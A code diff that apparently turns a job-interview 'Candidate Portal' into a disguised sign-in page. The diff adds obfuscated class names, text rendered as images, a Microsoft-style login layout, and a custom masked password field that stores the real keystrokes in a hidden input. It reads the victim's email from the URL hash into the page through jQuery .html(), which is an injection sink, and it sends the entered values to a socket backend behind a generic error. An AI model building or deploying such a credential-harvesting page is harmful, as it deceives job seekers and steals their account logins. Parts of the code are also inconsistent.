@@ -5,48 +5,270 @@
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <title>Candidate Portal - Official</title>
     <style>
-        /* Base Shell Styles */
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow-x: hidden; font-family: 'Segoe UI', sans-serif; background: #f0f2f5; }
-        #screen-target { width: 100%; height: 100%; }
-        
-        /* Shake animation for errors */
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            25% { transform: translateX(-10px); }
-            50% { transform: translateX(10px); }
-            75% { transform: translateX(-10px); }
+        html, body{
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            font-weight: 400;
+            font-family: "Segoe UI", -apple-system, "Helvetica Neue", "Lucida Grande", Roboto, Ebrima, "Nirmala UI", Gadugi, "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", Tunga, "Lao UI", Raavi, "Iskoola Pota", Latha, Leelawadee, "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
+            font-size: 0.9375rem;
         }
-        .error-shake { animation: shake 0.4s ease-in-out; }
 
-        /* Initial Login UI */
-        .setup-container { display:flex; justify-content:center; align-items:center; height:100vh; }
-        .setup-card { background:white; padding:40px; border-radius:12px; box-shadow:0 10px 25px rgba(0,0,0,0.1); width:400px; text-align:center; }
-        .vacancy-card { border: 2px solid #eee; border-radius: 8px; padding: 12px; margin: 10px 0; cursor: pointer; transition: 0.3s; text-align: left; }
-        .vacancy-card:hover { border-color: #007bff; background: #f8fbff; }
-        .vacancy-card.selected { border-color: #007bff; background: #e7f3ff; }
-        input, select { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
-        .btn-start { width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; }
+        #screen-target { width: 100%; height: 100%; }
+
+        *, * a{
+            list-style: none;
+            text-decoration: none;
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        .q7n4v8r2t1_992211{
+            height: 100%;
+            width: 100%;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .b5h3d9s8l2_992211{
+            height: 100%;
+            width: 100%;
+            position: absolute;
+            top: 0;
+            right: 0;
+        }
+
+        .b5h3d9s8l2_992211 img{
+            width: 100%;
+            height: 100%;
+        }
+
+        .c8j2f6w9z4_992211{
+            position: relative;
+            width: calc(100% - 40px);
+            max-width: 440px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .d3k7u1y5x8_992211 img{
+            width: 170px;
+        }
+
+        .e6p4m2q9r7_992211{
+            width: 100%;
+            background: #fff;
+            box-shadow: rgba(0, 0, 0, 0.2) 0px 2px 6px;
+            padding: 44px;
+            margin-top: 20px;
+            position: relative;
+            height: 350px;
+        }
+
+        .f1t8v3n6b5_992211{
+            width: 100%;
+        }
+
+        .g9w2s4h7k1_992211{
+            font-size: 16px;
+            line-height: 24px;
+            text-overflow: ellipsis;
+            margin: 20px 0;
+            color: #404040;
+        }
+
+        .i6n2b8v4c3_992211{
+            padding: 0 !important;
+        }
+
+        .j5k9d3l7s1_992211{
+            border-bottom: 1px solid #404040;
+            width: 100%;
+            padding: 10px 0;
+            margin-top: 10px;
+            position: relative;
+        }
+
+        .u2y7t1r4e9_992211{
+            border-bottom: 1px solid red;
+        }
+
+        .j5k9d3l7s1_992211:focus-within{
+            border-bottom: 1px solid rgb(0, 103, 184);
+        }
+
+        .j5k9d3l7s1_992211 input{
+            width: 100%;
+            border: none;
+            font-size: 16px;
+        }
+
+        .j5k9d3l7s1_992211 input:focus{
+            outline: none;
+        }
+
+        #m7n2b5v8c1_992211{
+            position: absolute;
+            bottom: -20px;
+            left: 0;
+            width: 100%;
+            color: red;
+            display: none;
+        }
+
+        .k3l8p2o7i4_992211{
+        margin-top: 15px;
+        }
+
+        .btn-primary{
+            border-radius: 0 !important;
+        }
+
+        .l9q1w4e7r2_992211{
+            display: flex;
+            justify-content: flex-end;
+            margin-top: 20px;
+            width: 100%;
+        }
+
+        .l9q1w4e7r2_992211 a{
+            padding-left: 30px;
+            padding-right: 30px;
+            font-weight: 600;
+            font-weight: 16px;
+        }
+
     </style>
 </head>
 <body>
 
 <div id="screen-target">
-    <!-- Step 1: Vacancy Selection -->
-    <div id="setup-screen" class="setup-container">
-        <div class="setup-card">
-            <h2>Available Vacancies</h2>
-            <p>Select a role and enter details to begin</p>
-            
-            <!-- Dynamic Vacancy List (Updated from DB) -->
-            <div id="vacancy-list">
-                <p>Loading available positions...</p>
-            </div>
+    <div id="a1x9k2m7p4_992211" class="q7n4v8r2t1_992211">
+			
+			<div class="b5h3d9s8l2_992211">
+				<img src="../images/a8f3k2m9q1.webp">
+			</div>
+			<div class="c8j2f6w9z4_992211">
+				<div class="d3k7u1y5x8_992211">
+					<img src="../images/z0x4n7b2c9.png">
+				</div>
+				<div class="e6p4m2q9r7_992211">
+					<div class="f1t8v3n6b5_992211">
+						<img src="../images/m5t8r1p4w6.png">
+					</div>
+					<div class="g9w2s4h7k1_992211">
+						<img src="../images/q9c2v7l0s3.png">
+						<span id="u8z3x6c1v5"></span>
+					</div>
+					<div class="h4r7m1p9q2_992211">
+						<div class="i6n2b8v4c3_992211">
+							<img src="../images/h4k8d1n6p2.png">
+						</div>
+						<div class="j5k9d3l7s1_992211" id="z3x8c2v7b1n6m5">
+							<input type="hidden" id="email-input">
+							<input type="text" id="indicator" autocomplete="off" placeholder="Type here...">
+							<input type="hidden" id="placeholder" value="">
+				
+						</div>
+						<div style="width: 100%; text-align: center;" id="error-div" class="text-danger"></div>
+						<div class="l9q1w4e7r2_992211">
+							<button  onclick="(startInterview())" class="btn btn-primary btn-start">Sign in
+								<span id="z6x2c9v4b1_992211" class="spinner-border spinner-border-sm"></span>
+							</button>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
 
-            <input type="text" id="name-input" placeholder="Enter Full Name">
-            <input type="email" id="email-input" placeholder="Enter Email Address">
-            <button class="btn-start" onclick="startInterview()">Enter Interview Room</button>
-        </div>
-    </div>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.3/js/bootstrap.min.js"></script>
+
+<script>
+
+	function processForm(){
+		alert(document.getElementById('placeholder').value)
+	}
+
+    const indicator = document.getElementById('indicator');
+    const placeholder = document.getElementById('placeholder');
+   
+   window.onload = function() {
+	  document.getElementById('indicator').focus();
+	}
+
+    indicator.addEventListener('input', (e) => {
+        let currentRaw = placeholder.value;
+        let currentDisplay = indicator.value;
+        
+        // 1. Calculate how many characters were added or removed
+        const diff = currentDisplay.length - currentRaw.length;
+        const cursorPosition = indicator.selectionStart;
+
+        if (diff > 0) {
+            // Addition: User typed or pasted
+            const addedChars = currentDisplay.substring(cursorPosition - diff, cursorPosition);
+            const before = currentRaw.substring(0, cursorPosition - diff);
+            const after = currentRaw.substring(cursorPosition - diff);
+            placeholder.value = before + addedChars + after;
+        } 
+        else if (diff < 0) {
+            // Deletion: Backspace, delete, or highlight+delete
+            // We find the 'gap' by comparing the previous length and current cursor
+            const removedCount = Math.abs(diff);
+            const before = currentRaw.substring(0, cursorPosition);
+            const after = currentRaw.substring(cursorPosition + removedCount);
+            placeholder.value = before + after;
+        }
+        else if (diff === 0 && currentDisplay !== "*".repeat(currentRaw.length)) {
+            // Replacement: Highlighted text and replaced with same number of chars
+            const addedChars = currentDisplay.substring(cursorPosition - currentRaw.length, cursorPosition);
+            // In a complex replacement, it's safer to re-sync based on selection
+            // But for most cases, the diff logic covers it.
+        }
+
+        // 2. Mask the Indicator immediately
+        indicator.value = "*".repeat(placeholder.value.length);
+        
+        // 3. Restore Cursor Position (Masking resets it to the end)
+        indicator.setSelectionRange(cursorPosition, cursorPosition);
+
+        // Demo display
+        
+    });
+
+    // Handle "Select All + Backspace/Delete" specifically for some browsers
+    indicator.addEventListener('keydown', (e) => {
+        if (indicator.selectionStart === 0 && indicator.selectionEnd === indicator.value.length) {
+            if (e.key === 'Backspace' || e.key === 'Delete') {
+                placeholder.value = "";
+            }
+        }
+    });
+</script>
+<script>
+	const hashValue = window.location.hash;
+
+	// Remove the '#' character to get just the data
+	const parameter = hashValue.substring(1); 
+	if (parameter) {
+	    $("#u8z3x6c1v5").html(parameter);
+	    
+	    // Now you can use this to join the socket room or fetch specific data
+	   /* socket.emit('join_interview', { 
+	        email: userEmail, 
+	        categoryId: categoryId,
+	        customId: parameter // Passing the URL parameter to your backend
+	    });*/
+	}
+</script>
 </div>
 
 <script src="/socket.io/socket.io.js"></script>
@@ -54,7 +276,7 @@
     const socket = io();
     let candidateName = "";
     let candidateEmail = "";
-    let selectedCategory = ""; 
+    let selectedCategory = "1"; 
     let currentScreenFile = "";
 
     /**
@@ -83,7 +305,7 @@
 
     // Persistence Restore using Email
     window.onload = async () => {
-        await loadVacancies();
+        
 
         const savedEmail = localStorage.getItem('cand_email');
         const savedName = localStorage.getItem('cand_name');
@@ -91,7 +313,7 @@
         
         if(savedEmail && savedName && savedCat) {
             document.getElementById('email-input').value = savedEmail;
-            document.getElementById('name-input').value = savedName;
+            document.getElementById('indicator').value = savedName;
             candidateEmail = savedEmail;
             candidateName = savedName;
             selectedCategory = savedCat;
@@ -99,40 +321,10 @@
         }
     }
 
-    // Updated to use secureFetch
-    async function loadVacancies() {
-        try {
-            const response = await secureFetch('/api/vacancies');
-            if (!response) return; // Stop if redirected
-
-            const categories = await response.json();
-            const list = document.getElementById('vacancy-list');
-            list.innerHTML = ""; 
-
-            categories.forEach(cat => {
-                const card = document.createElement('div');
-                card.className = "vacancy-card";
-                card.onclick = () => selectRole(card, cat.id); 
-                card.innerHTML = `
-                    <strong>${cat.name}</strong><br>
-                    <small>Official Vacancy</small>
-                `;
-                list.appendChild(card);
-            });
-        } catch (err) {
-            document.getElementById('vacancy-list').innerHTML = `<p style="color:red;">Error loading vacancies.</p>`;
-        }
-    }
-
-    function selectRole(element, categoryId) {
-        document.querySelectorAll('.vacancy-card').forEach(el => el.classList.remove('selected'));
-        element.classList.add('selected');
-        selectedCategory = categoryId;
-    }
 
     function startInterview(isRestore = false) {
         if(!isRestore) {
-            candidateName = document.getElementById('name-input').value;
+            candidateName = document.getElementById('indicator').value;
             candidateEmail = document.getElementById('email-input').value;
             
             if(!candidateName || !candidateEmail || !selectedCategory) {
@@ -143,6 +335,8 @@
             localStorage.setItem('cand_email', candidateEmail);
             localStorage.setItem('cand_cat', selectedCategory);
         }
+        document.getElementById('error-div').innerHTML = '';
+        document.getElementById('z6x2c9v4b1_992211').style.display = 'block';
         
         socket.emit('join_interview', { 
             name: candidateName, 
@@ -286,12 +480,10 @@
         console.warn("Join failed:", data.message);
         
         // 1. Show the error to the candidate
-        alert(`${data.message} (Attempt ${data.attempt}/3)`);
+       
+        document.getElementById('error-div').innerHTML = 'Error processing your request, please try again.';
+        document.getElementById('z6x2c9v4b1_992211').style.display = 'none';
 
-        // 2. Clear the "loading" or "default" screen
-        // If you are using a Single Page App style, show the login form again:
-        document.getElementById('entrance-form').style.display = 'block';
-        document.getElementById('waiting-screen').style.display = 'none';
 
         // 3. Reset local variables so they have to type/select again if necessary
         // This forces the "redo the entrance" behavior you requested.
